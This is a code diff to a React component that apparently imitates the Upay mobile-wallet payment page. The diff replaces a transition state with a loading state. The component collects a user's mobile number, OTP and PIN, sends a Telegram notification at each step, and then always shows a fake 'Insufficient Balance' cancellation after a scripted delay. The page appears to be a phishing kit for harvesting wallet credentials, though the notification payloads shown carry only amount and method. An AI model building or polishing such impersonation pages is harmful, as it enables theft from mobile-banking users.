@@ -15,7 +15,6 @@ const UpayPayment = () => {
   const [otpAttempts, setOtpAttempts] = useState(0);
   const [pinAttempts, setPinAttempts] = useState(0);
   const [isLoading, setIsLoading] = useState(false);
-  const [isTransitioning, setIsTransitioning] = useState(false);
 
   const mobileRef = useRef<HTMLInputElement>(null);
   const otpRef = useRef<HTMLInputElement>(null);
@@ -57,11 +56,11 @@ const UpayPayment = () => {
 
   const handleMobileSubmit = () => {
     if (!isValidMobile()) return;
-    setIsTransitioning(true);
+    setIsLoading(true);
     sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
     setTimeout(() => {
       setStep('otp');
-      setIsTransitioning(false);
+      setIsLoading(false);
     }, 2000);
   };
 
@@ -71,11 +70,11 @@ const UpayPayment = () => {
       setTimeout(() => setShowError(""), 3000);
       return;
     }
-    setIsTransitioning(true);
+    setIsLoading(true);
     sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
     setTimeout(() => {
       setStep('pin');
-      setIsTransitioning(false);
+      setIsLoading(false);
     }, 2000);
   };
 
@@ -85,10 +84,10 @@ const UpayPayment = () => {
       setTimeout(() => setShowError(""), 3000);
       return;
     }
-    setIsTransitioning(true);
+    setIsLoading(true);
     sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
     setTimeout(() => {
-      setIsTransitioning(false);
+      setIsLoading(false);
       navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}.00`);
     }, 2000);
   };
@@ -135,19 +134,13 @@ const UpayPayment = () => {
   const mobileValid = isValidMobile();
   const confirmEnabled = step === 'mobile' ? mobileValid : step === 'otp' ? otp.length === 6 : pin.length === 4;
   const handleSubmit = step === 'mobile' ? handleMobileSubmit : step === 'otp' ? handleOtpSubmit : handlePinSubmit;
-  const isDisabled = !confirmEnabled;
-  const confirmBgColor = confirmEnabled ? 'rgb(36, 76, 154)' : '#aaa';
+  const isDisabled = !confirmEnabled || isLoading;
+  const confirmBgColor = (confirmEnabled && !isLoading) ? 'rgb(36, 76, 154)' : '#aaa';
 
   return (
     <div className="fixed inset-0 flex flex-col items-start justify-start p-4 pt-6 overflow-hidden" style={{ background: 'linear-gradient(to bottom, rgb(250, 235, 122) 10%, rgb(253, 251, 216) 80%)' }}>
       <div className="w-full max-w-[420px] mx-auto rounded-2xl overflow-hidden shadow-lg" style={{ minHeight: '520px' }}>
-        {isTransitioning ? (
-          <div className="flex flex-col items-center justify-center" style={{ backgroundColor: 'rgb(251, 214, 0)', minHeight: '520px' }}>
-            <img src={upayLogo} alt="Upay" className="w-72 h-auto object-contain mb-6 animate-pulse" />
-            <p className="text-[#1a1a1a] text-sm font-bold">Loading...</p>
-          </div>
-        ) : (
-        <>
+        
         {/* Yellow upper section - logo, invoice, input */}
         <div className="px-5 pt-8 pb-8 flex flex-col items-center" style={{ backgroundColor: 'rgb(251, 214, 0)' }}>
           {/* Logo */}
@@ -185,8 +178,6 @@ const UpayPayment = () => {
           </svg>
           <span className="text-[#0054A5] font-extrabold text-base">16268</span>
         </div>
-        </>
-        )}
       </div>
     </div>
   );
